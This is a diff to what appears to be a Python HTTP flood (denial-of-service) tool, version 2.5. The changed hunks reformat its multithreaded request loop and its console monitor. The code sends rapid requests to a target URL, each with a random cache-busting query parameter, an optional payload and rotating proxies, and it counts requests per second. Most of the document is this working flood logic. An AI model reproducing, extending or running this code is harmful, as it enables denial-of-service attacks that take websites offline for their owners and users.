@@ -30,10 +30,11 @@ print(f"""{Fore.LIGHTYELLOW_EX}
                         ██      █████   ██ ████ ██ ██    ██ ██ ██  ██ ███████ ██   ██ █████   
                         ██      ██      ██  ██  ██ ██    ██ ██  ██ ██ ██   ██ ██   ██ ██      
                         ███████ ███████ ██      ██  ██████  ██   ████ ██   ██ ██████  ███████ {Fore.RESET}
-                                                    {Fore.LIGHTMAGENTA_EX}version 2.5{Fore.RESET}   
+                                                    {Fore.LIGHTMAGENTA_EX}version 2.5{Fore.RESET}   {Fore.RESET}
+
+
+
 """)
-for _ in range(3):
-    print("")
 with open("./config.json","r") as f:
     config = json.load(f);
 
@@ -168,9 +169,20 @@ class httpcall(threading.Thread):
                 if proxy == "":
                     try:
                         if self.usepayload == True:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header,data=self.payload, timeout=self.timeout)
+                            lres = requests.request(
+                                self.method,
+                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
+                                headers=header,
+                                data=self.payload,
+                                timeout=self.timeout
+                                )
                         else:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, timeout=self.timeout)
+                            lres = requests.request(
+                                self.method,
+                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
+                                headers=header,
+                                timeout=self.timeout
+                                )
                         #print(lres.text)
                         #proxies.append(proxy)
                     except Exception as e:
@@ -181,14 +193,25 @@ class httpcall(threading.Thread):
                 else:
                     try:
                         if self.usepayload == True:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, data=self.payload, timeout=self.timeout, proxies={
-                                "http":"http://"+proxy,
-                                "https":"http://"+proxy,
+                            lres = requests.request(
+                                self.method,
+                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
+                                headers=header,
+                                data=self.payload,
+                                timeout=self.timeout,
+                                proxies={
+                                    "http":"http://"+proxy,
+                                    "https":"http://"+proxy,
                             })
                         else:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, timeout=self.timeout, proxies={
-                                "http":"http://"+proxy,
-                                "https":"http://"+proxy,
+                            lres = requests.request(
+                                self.method,
+                                f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",
+                                headers=header,
+                                timeout=self.timeout,
+                                proxies={
+                                    "http":"http://"+proxy,
+                                    "https":"http://"+proxy,
                             })
                         proxies.append(proxy)
                     except Exception as e:
@@ -231,13 +254,14 @@ class MonitorThread(threading.Thread):
         self.beforerequestcount = 0
         self.newrequest = []
     def run(self):
+        print("\n                            ")
         while True:
             time.sleep(1)
             self.newrequest.append(request_counter - self.beforerequestcount)
             allcount = 0
             for i in self.newrequest:
                 allcount += i
-            print(f"\r                            Summary All:{request_counter}\n                            New Request:{request_counter - self.beforerequestcount}\n                            Average new request:{round(allcount / len(self.newrequest))}\033[2A",end="")
+            print(f"\033[2A\r                            Summary All:{request_counter}\n                            New Request:{request_counter - self.beforerequestcount}\n                            Average new request:{round(allcount / len(self.newrequest))}",end="")
             self.beforerequestcount = request_counter
 
 
